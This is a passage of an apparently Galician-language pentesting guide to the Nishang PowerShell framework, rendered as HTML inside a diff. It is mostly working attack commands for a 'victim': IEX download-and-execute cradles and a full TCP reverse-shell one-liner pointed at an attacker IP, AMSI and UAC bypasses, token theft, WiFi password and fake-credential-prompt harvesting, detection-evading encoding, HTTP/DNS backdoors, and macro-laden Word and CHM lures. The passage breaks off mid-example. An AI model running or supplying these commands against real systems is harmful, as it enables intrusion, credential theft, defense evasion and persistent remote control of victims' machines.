+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>├── MITM/                # Ataques Man-in-the-Middle
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>├── Pivot/               # Scripts de pivoting
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>├── Prasadhak/           # Backdoors baseados en DNS
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>├── Scan/                # Scripts de escaneo
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>└── Shells/              # Reverse e bind shells
+</span></code></pre></div>
+<h2 id="modulos-principais">Módulos Principais</h2>
+<h3 id="1-shells">1. Shells</h3>
+<p>Os scripts máis usados de Nishang para obter acceso remoto.</p>
+<div class="admonition info">
+<p class="admonition-title">Validez dos Scripts de Nishang</p>
+<p>Nishang non mantén unha lista oficial de scripts funcionais. A validez dun script determínase pola súa compatibilidade co Windows moderno, a súa capacidade de abrir unha sesión interactiva real e o seu uso continuado en laboratorios e escenarios actuais. Baixo estes criterios, <strong>só os shells TCP/UDP de Nishang seguen sendo operativos hoxe</strong>. O script <code>Invoke-PowerShellIcmp.ps1</code> envía paquetes ICMP baleiros e <strong>non funciona</strong> con listeners estándar.</p>
+</div>
+<h4 id="como-funciona-a-carga-en-memoria">Como funciona a carga en memoria</h4>
+<p>Cando executas un script de Nishang con <code>IEX (Invoke-Expression)</code> ocorre o seguinte:</p>
+<ol>
+<li><strong>DownloadString</strong> descarga o contido do ficheiro <code>.ps1</code> desde o servidor HTTP como texto</li>
+<li><strong>IEX</strong> executa ese texto <strong>en memoria</strong> (sen tocar disco, deixando menos rastro)</li>
+<li>O script <strong>define a función</strong> (por exemplo <code>Invoke-PowerShellTcp</code>) e cárgaa na sesión atual de PowerShell</li>
+<li>A función <strong>queda dispoñible en memoria</strong> esperando ser chamada</li>
+<li><strong>IMPORTANTE</strong>: A función <strong>NON se executa automaticamente</strong>, tes que chamala explícitamente</li>
+</ol>
+<p>Por iso necesitas <strong>dous pasos</strong>: cargar (IEX) + executar (chamar á función).</p>
+<div class="admonition tip">
+<p class="admonition-title">Entendendo <code>powershell -ep bypass -c</code></p>
+<p>Esta combinación de opcións é fundamental en pentesting con PowerShell:</p>
+<ul>
+<li><strong><code>powershell</code></strong>: Inicia unha nova sesión de PowerShell</li>
+<li><strong><code>-ep bypass</code></strong> (ExecutionPolicy Bypass): Desactiva temporalmente as restricións de execución de scripts de Windows</li>
+<li><strong><code>-c</code></strong> (Command): Indica que o seguinte é un comando a executar</li>
+</ul>
+<p><strong>Por que é necesario?</strong> Windows bloquea por defecto a execución de scripts non asinados. Con <code>-ep bypass</code> evitamos este bloqueo sen modificar a configuración do sistema.</p>
+<p><strong>Exemplo completo</strong>:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>    <span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)&quot;</span>
+</span></code></pre></div></p>
+<p><strong>Opcións adicionais útiles</strong>:</p>
+<ul>
+<li><code>-w hidden</code>: Oculta a ventana de PowerShell</li>
+<li><code>-nop</code> (NoProfile): Non carga o perfil do usuario (máis rápido)</li>
+<li><code>-noni</code> (NonInteractive): Non espera interacción do usuario</li>
+</ul>
+<p><strong>Comprobar política actual</strong>:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>    <span class="nb">Get-ExecutionPolicy</span>
+</span></code></pre></div></p>
+</div>
+<h4 id="invoke-powershelltcp-reverse-shell">Invoke-PowerShellTcp (Reverse Shell)</h4>
+<p><strong>Uso básico (dous pasos)</strong>:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># Paso 1: Descarga o script e carga a función en memoria (NON produce saída visible)</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c"># Paso 2: Agora executa a función que está cargada en memoria</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span> <span class="n">-Port</span> <span class="n">4444</span>
+</span></code></pre></div></p>
+<p><strong>Comprobar se a función está en memoria</strong>:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># Antes de cargar o script: dará erro</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">Get-Command</span> <span class="nb">Invoke-PowerShellTcp</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c"># Resultado: Get-Command : The term &#39;Invoke-PowerShellTcp&#39; is not recognized...</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c"># Despois de executar IEX: debería amosar a función</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nb">Get-Command</span> <span class="nb">Invoke-PowerShellTcp</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c"># Resultado: Function        Invoke-PowerShellTcp</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c"># Ver funcións de Nishang cargadas</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="nb">Get-Command</span> <span class="n">-CommandType</span> <span class="k">Function</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s2">&quot;Invoke-*&quot;</span><span class="p">}</span>
+</span></code></pre></div></p>
+<p><strong>Versión todo nun só paso</strong> (usando punto e coma para separar comandos):
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span> <span class="n">-Port</span> <span class="n">4444</span>
+</span></code></pre></div></p>
+<p><strong>Versión con script modificado</strong> (recomendado para simplificar ataques):</p>
+<p>Primeiro, modifica o ficheiro no Kali engadindo ao <strong>final</strong> do script a chamada á función:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Editar o ficheiro</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>nano<span class="w"> </span>Shells/Invoke-PowerShellTcp.ps1
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Engadir AO FINAL (despois de pechar a función, última liña):</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>Invoke-PowerShellTcp<span class="w"> </span>-Reverse<span class="w"> </span>-IPAddress<span class="w"> </span><span class="m">10</span>.10.14.5<span class="w"> </span>-Port<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></p>
+<p>Agora o script defínese <strong>e execútase automaticamente</strong> cun só comando desde Windows:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">)</span>
+</span></code></pre></div></p>
+<p><strong>Escoitar no atacante</strong>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></p>
+<h4 id="invoke-powershelltcponeline">Invoke-PowerShellTcpOneLine</h4>
+<p>Shell reversa nun só comando:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.10.14.5&#39;</span><span class="p">,</span><span class="n">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</span></code></pre></div></p>
+<h3 id="2-gather-recoleccion-de-informacion">2. Gather (Recolección de Información)</h3>
+<h4 id="get-information">Get-Information</h4>
+<p>Recolle información completa do sistema:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Gather</span><span class="p">\</span><span class="nb">Get-Information</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">Get-Information</span>
+</span></code></pre></div></p>
+<p>Exportar a ficheiro:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">Get-Information</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">info</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div></p>
+<h4 id="get-wlan-keys">Get-WLAN-Keys</h4>
+<p>Obtén contrasinais de redes WiFi gardadas:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Gather</span><span class="p">\</span><span class="nb">Get-WLAN</span><span class="n">-Keys</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">Get-WLAN</span><span class="n">-Keys</span>
+</span></code></pre></div></p>
+<h4 id="invoke-credentialsphish">Invoke-CredentialsPhish</h4>
+<p>Crea unha ventana falsa de credenciais:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Gather</span><span class="p">\</span><span class="nb">Invoke-CredentialsPhish</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">Invoke-CredentialsPhish</span>
+</span></code></pre></div></p>
+<h3 id="3-escalation-escalada-de-privilexios">3. Escalation (Escalada de Privilexios)</h3>
+<h4 id="invoke-psuacme">Invoke-PsUACme</h4>
+<p>Bypass de UAC:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Escalation</span><span class="p">\</span><span class="nb">Invoke-PsUACme</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nb">Invoke-PsUACme</span> <span class="n">-Verbose</span>
+</span></code></pre></div></p>
+<p>Métodos específicos:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">Invoke-PsUACme</span> <span class="n">-method</span> <span class="n">oobe</span> <span class="n">-Verbose</span>
+</span></code></pre></div></p>
+<h4 id="enable-duplicatetoken">Enable-DuplicateToken</h4>
+<p>Roba tokens de procesos:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Escalation</span><span class="p">\</span><span class="nb">Enable-DuplicateToken</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">Enable-DuplicateToken</span>
+</span></code></pre></div></p>
+<h3 id="4-execution-execucion">4. Execution (Execución)</h3>
+<h4 id="invoke-encode">Invoke-Encode</h4>
+<p>Codifica comandos para evadir detección:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Execution</span><span class="p">\</span><span class="nb">Invoke-Encode</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">Invoke-Encode</span> <span class="n">-DataToEncode</span> <span class="s2">&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)&quot;</span>
+</span></code></pre></div></p>
+<h4 id="download-execute-ps">Download-Execute-PS</h4>
+<p>Descarga e executa scripts:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Execution</span><span class="p">\</span><span class="n">Download-Execute-PS</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">Download-Execute-PS</span> <span class="n">-URL</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">payload</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div></p>
+<h3 id="5-bypass-evasion">5. Bypass (Evasión)</h3>
+<h4 id="invoke-amsibypass">Invoke-AmsiBypass</h4>
+<p>Desactiva Windows Antimalware Scan Interface:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Bypass</span><span class="p">\</span><span class="nb">Invoke-AmsiBypass</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nb">Invoke-AmsiBypass</span>
+</span></code></pre></div></p>
+<p>Exemplo de uso combinado:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c"># Primeiro bypass de AMSI</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">Invoke-AmsiBypass</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c"># Logo executa o payload</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/payload.ps1&#39;</span><span class="p">)</span>
+</span></code></pre></div></p>
+<h3 id="6-backdoors">6. Backdoors</h3>
+<h4 id="http-backdoor">HTTP-Backdoor</h4>
+<p>Backdoor que comunica por HTTP:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Backdoors</span><span class="p">\</span><span class="n">HTTP-Backdoor</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">HTTP-Backdoor</span> <span class="n">-CheckURL</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">check</span> <span class="n">-PayloadURL</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">payload</span>
+</span></code></pre></div></p>
+<h4 id="dns_txt_pwnage">DNS_TXT_Pwnage</h4>
+<p>Backdoor que usa consultas DNS TXT:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Backdoors</span><span class="p">\</span><span class="n">DNS_TXT_Pwnage</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">DNS_TXT_Pwnage</span> <span class="n">-startdomain</span> <span class="n">start</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="n">-cmdstring</span> <span class="n">cmd</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span>
+</span></code></pre></div></p>
+<h3 id="7-client-lado-do-cliente">7. Client (Lado do Cliente)</h3>
+<h4 id="out-chm">Out-CHM</h4>
+<p>Crea arquivos CHM maliciosos:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Client</span><span class="p">\</span><span class="nb">Out-CHM</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nb">Out-CHM</span> <span class="n">-Payload</span> <span class="s2">&quot;powershell.exe -c IEX...&quot;</span> <span class="n">-HHCPath</span> <span class="s2">&quot;C:\Program Files (x86)\HTML Help Workshop&quot;</span>
+</span></code></pre></div></p>
+<h4 id="out-word">Out-Word</h4>
+<p>Xera documentos Word con macros:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Client</span><span class="p">\</span><span class="nb">Out-Word</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">Out-Word</span> <span class="n">-Payload</span> <span class="s2">&quot;powershell.exe IEX...&quot;</span> <span class="n">-OutputFile</span> <span class="n">Doc1</span><span class="p">.</span><span class="n">doc</span>
+</span></code></pre></div></p>
+<h3 id="8-pivot">8. Pivot</h3>
+<h4 id="invoke-networkrelay">Invoke-NetworkRelay</h4>
+<p>Relay de conexións de rede:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Pivot</span><span class="p">\</span><span class="nb">Invoke-NetworkRelay</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="nb">Invoke-NetworkRelay</span> <span class="n">-LocalPort</span> <span class="n">8080</span> <span class="n">-RemoteIP</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">100</span><span class="p">.</span><span class="n">10</span> <span class="n">-RemotePort</span> <span class="n">80</span>
+</span></code></pre></div></p>
+<h2 id="exemplos-practicos-completos">Exemplos Prácticos Completos</h2>
+<h3 id="escenario-1-shells-reversas-e-bind">Escenario 1: Shells Reversas e Bind</h3>
+<h4 id="opcion-a-reverse-shell-tcp-invoke-powershelltcp">Opción A: Reverse Shell TCP (Invoke-PowerShellTcp)</h4>
+<p><strong>Paso 1</strong> - Preparar o servidor HTTP no atacante:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">cd</span><span class="w"> </span>nishang
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span></code></pre></div></p>
+<p><strong>Paso 2</strong> - Escoitar conexións:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></p>
+<p><strong>Paso 3</strong> - Executar na vítima:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444&quot;</span>
+</span></code></pre></div></p>
+<h4 id="opcion-b-reverse-shell-oneline-recomendado-mais-estable">Opción B: Reverse Shell OneLine (RECOMENDADO - Máis estable)</h4>
+<p>Esta versión é <strong>máis fiable</strong> porque non depende de funcións complexas.</p>
+<p><strong>Paso 1</strong> - Editar script no Kali para personalizar IP e porto:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>nano<span class="w"> </span>Shells/Invoke-PowerShellTcpOneLine.ps1
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="c1"># Editar na liña 3 (a única liña de código, eliminar comentarios):</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="c1"># $client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.5&#39;,4444);</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="c1"># Cambiar IP e porto polos teus valores</span>
+</span></code></pre></div></p>
+<p><strong>Paso 2</strong> - Escoitar no atacante:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></p>
+<p><strong>Paso 3</strong> - Executar na vítima:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcpOneLine.ps1&#39;)&quot;</span>
+</span></code></pre></div></p>
+<h4 id="opcion-c-bind-shell-tcp">Opción C: Bind Shell TCP</h4>
+<p>Útil cando hai firewall de <strong>saída</strong> na vítima pero podes abrir portos de <strong>entrada</strong>.</p>
+<p><strong>Paso 1</strong> - Crear regra firewall no Windows (vítima):
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nb">New-NetFirewallRule</span> <span class="n">-DisplayName</span> <span class="s2">&quot;Allow TCP 4444&quot;</span> <span class="n">-Direction</span> <span class="n">Inbound</span> <span class="n">-Protocol</span> <span class="n">TCP</span> <span class="n">-LocalPort</span> <span class="n">4444</span> <span class="n">-Action</span> <span class="n">Allow</span>
+</span></code></pre></div></p>
+<p><strong>Paso 2</strong> - Editar script no Kali:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>nano<span class="w"> </span>Shells/Invoke-PowerShellTcpOneLineBind.ps1
